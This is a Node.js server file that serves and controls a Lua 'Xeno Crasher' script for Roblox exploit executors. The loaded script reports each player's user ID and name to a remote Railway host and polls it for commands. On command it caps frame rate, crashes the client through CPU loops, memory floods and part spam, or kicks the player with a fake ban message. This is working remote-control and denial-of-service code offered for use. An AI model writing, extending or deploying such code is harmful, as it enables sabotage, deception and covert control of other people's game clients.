const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const PUBLIC_URL = process.env.PUBLIC_URL || 'https://crasherscript-production.up.railway.app';

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Api-Key']
}));
app.use(express.json({ limit: '10mb' }));

const players = new Map();

// ============================================
// LOADER SCRIPT - WITH FIXED POLLING
// ============================================
app.get('/loader.lua', (req, res) => {
    const loader = `--[[ Xeno Crasher Client ]]--
local BASE = "${PUBLIC_URL}"
local KEY  = "xenooooo"

-- ============================================
-- SIMPLE HTTP - WORKS ON ALL EXECUTORS
-- ============================================
local function sendRequest(url, method, data)
    local HttpService = game:GetService("HttpService")
    HttpService.HttpEnabled = true
    
    local functions = {
        function() return syn and syn.request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
        function() return request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
        function() return http and http.request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
        function() return fluxus and fluxus.request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
        function() return http_request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
        function()
            if method == "POST" then
                return HttpService:PostAsync(url, data or "", Enum.HttpContentType.ApplicationJson)
            else
                return HttpService:GetAsync(url)
            end
        end
    }
    
    for _, fn in ipairs(functions) do
        local success, result = pcall(fn)
        if success and result then
            return result
        end
    end
    
    return nil
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer

if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

local function safe(fn)
    local ok, res = pcall(fn)
    if ok then return res end
    return nil
end

-- ============================================
-- GUI
-- ============================================
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "XenoCrasherGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = LP:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 220, 0, 60)
    frame.Position = UDim2.new(0.5, -110, 0.9, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.4
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(100, 255, 100)
    frame.Parent = screenGui
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 30)
    label.Text = "✅ Xeno Crasher"
    label.TextColor3 = Color3.fromRGB(100, 255, 100)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.SourceSansBold
    label.TextSize = 14
    label.Parent = frame
    
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0, 20)
    status.Position = UDim2.new(0, 0, 0, 30)
    status.Text = "🟢 Waiting for commands..."
    status.TextColor3 = Color3.fromRGB(150, 150, 150)
    status.BackgroundTransparency = 1
    status.Font = Enum.Font.SourceSans
    status.TextSize = 11
    status.Parent = frame
    
    return screenGui, status
end

local gui, statusLabel = createGUI()

-- ============================================
-- HEARTBEAT
-- ============================================
local function heartbeat()
    safe(function()
        local data = HttpService:JSONEncode({
            user_id = LP.UserId,
            username = LP.Name,
            display_name = LP.DisplayName,
            executor = "XenoClient",
            online = true
        })
        
        local result = sendRequest(BASE .. "/api/public/heartbeat", "POST", data)
        
        if result then
            statusLabel.Text = "🟢 Connected - " .. os.date("%H:%M:%S")
        else
            statusLabel.Text = "⚠️ Connection issue..."
        end
    end)
end

-- ============================================
-- FPS LIMIT
-- ============================================
local fpsConnection = nil
local fpsActive = false

local function setFPSLimit(targetFPS)
    print("🎯 Setting FPS to: " .. tostring(targetFPS))
    
    if fpsConnection then
        fpsConnection:Disconnect()
        fpsConnection = nil
        fpsActive = false
    end
    
    if not targetFPS or targetFPS <= 0 then
        statusLabel.Text = "🟢 FPS limit disabled"
        return
    end
    
    fpsActive = true
    local frameTime = 1 / targetFPS
    statusLabel.Text = "🎯 FPS limited to " .. targetFPS
    
    fpsConnection = RunService.RenderStepped:Connect(function()
        local startTime = tick()
        while tick() - startTime < frameTime and fpsActive do
            -- Busy loop to cap FPS
        end
    end)
end

-- ============================================
-- ✅ FIXED: POLL - MORE RELIABLE
-- ============================================
local function poll()
    safe(function()
        print("📡 Polling for commands...")
        
        local result = sendRequest(BASE .. "/api/public/command?user_id=" .. LP.UserId, "GET")
        
        if result and result ~= "" then
            print("📥 Raw response: " .. tostring(result))
            
            local data = HttpService:JSONDecode(result)
            print("📥 Decoded: " .. HttpService:JSONEncode(data))
            
            -- ✅ FPS LIMIT
            if data.fps_limit then
                local targetFPS = tonumber(data.fps_limit)
                if targetFPS and targetFPS > 0 then
                    setFPSLimit(targetFPS)
                else
                    setFPSLimit(nil)
                end
            end
            
            -- ✅ CRASH
            if data.crash == true then
                print("💥 CRASH COMMAND RECEIVED!")
                statusLabel.Text = "💥 CRASHING!"
                statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                
                -- Method 1: Infinite loop
                task.spawn(function()
                    while true do
                        local x = 0
                        for i = 1, 1000000 do
                            x = x + i
                        end
                    end
                end)
                
                -- Method 2: Memory flood
                task.spawn(function()
                    local t = {}
                    while true do
                        for i = 1, 1000 do
                            t[#t + 1] = string.rep("X", 50000)
                        end
                        task.wait()
                    end
                end)
                
                -- Method 3: Part spam
                task.spawn(function()
                    for i = 1, 5000 do
                        local p = Instance.new("Part")
                        p.Size = Vector3.new(100, 100, 100)
                        p.Parent = workspace
                        p.Position = Vector3.new(
                            math.random(-1000, 1000),
                            math.random(-1000, 1000),
                            math.random(-1000, 1000)
                        )
                        task.wait(0.01)
                    end
                end)
            end
            
            -- ✅ KICK
            if data.kick == true then
                print("👢 KICK COMMAND RECEIVED!")
                statusLabel.Text = "👢 KICKED!"
                task.wait(0.5)
                LP:Kick("You have been banned.")
            end
        else
            print("📡 No commands received")
        end
    end)
end

-- ============================================
-- START
-- ============================================
print("🚀 Starting Xeno Crasher...")
heartbeat()

-- Poll every 0.5 seconds (faster response)
task.spawn(function()
    while true do
        poll()
        task.wait(0.5)
    end
end)

-- Heartbeat every 5 seconds
task.spawn(function()
    while true do
        heartbeat()
        task.wait(5)
    end
end)

print("✅ Xeno Crasher loaded!")
print("👤 Player: " .. LP.Name)
print("📡 Polling for commands every 0.5 seconds")
`;

    res.setHeader('Content-Type', 'text/plain');
    res.send(loader);
});

// ============================================
// API ENDPOINTS
// ============================================

app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }
    const userId = String(data.user_id);
    
    const existing = players.get(userId) || {};
    players.set(userId, {
        ...existing,
        ...data,
        user_id: userId,
        online: true,
        lastHeartbeat: Date.now()
    });
    
    console.log(`❤️ Heartbeat from: ${data.username || userId}`);
    res.json({ status: 'ok' });
});

app.get('/api/players', (req, res) => {
    const list = [];
    const now = Date.now();
    const OFFLINE_THRESHOLD = 15000;

    for (const [id, p] of players.entries()) {
        const timeSinceLast = now - (p.lastHeartbeat || 0);
        const online = timeSinceLast < OFFLINE_THRESHOLD;
        
        p.online = online;
        list.push({ ...p });
        players.set(id, p);
    }
    
    console.log(`📊 Sending ${list.length} players`);
    res.json({ players: list });
});

app.post('/api/command', (req, res) => {
    const { user_id, fps_limit, kick, crash } = req.body;
    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(user_id);
    const p = players.get(userId);
    if (!p) return res.status(404).json({ error: 'Player not found' });
    
    console.log(`📨 Command received for ${p.username || userId}:`, req.body);
    
    if (fps_limit !== undefined) {
        p.fps_limit = parseInt(fps_limit) || false;
        console.log(`🎯 FPS set to ${p.fps_limit} for: ${p.username || userId}`);
    }
    if (kick === true) {
        p._kick = true;
        console.log(`👢 KICK SENT TO: ${p.username || userId}`);
    }
    if (crash === true) {
        p._crash = true;
        console.log(`💥 CRASH SENT TO: ${p.username || userId}`);
    }
    
    players.set(userId, p);
    res.json({ status: 'ok', message: 'Command stored' });
});

app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) {
        console.log(`📡 Player ${userId} not found`);
        return res.json({});
    }
    
    const response = {};
    
    if (p.fps_limit) {
        response.fps_limit = p.fps_limit;
        p.fps_limit = false;
    }
    if (p._crash) {
        response.crash = true;
        p._crash = false;
    }
    if (p._kick) {
        response.kick = true;
        p._kick = false;
    }
    
    players.set(String(userId), p);
    
    if (Object.keys(response).length > 0) {
        console.log(`📤 Sending command to ${p.username || userId}:`, response);
    }
    
    res.json(response);
});

// ============================================
// SERVE FRONTEND
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, () => {
    console.log(`🚀 Xeno Crasher Server running on port ${PORT}`);
    console.log(`📍 Public URL: ${PUBLIC_URL}`);
});
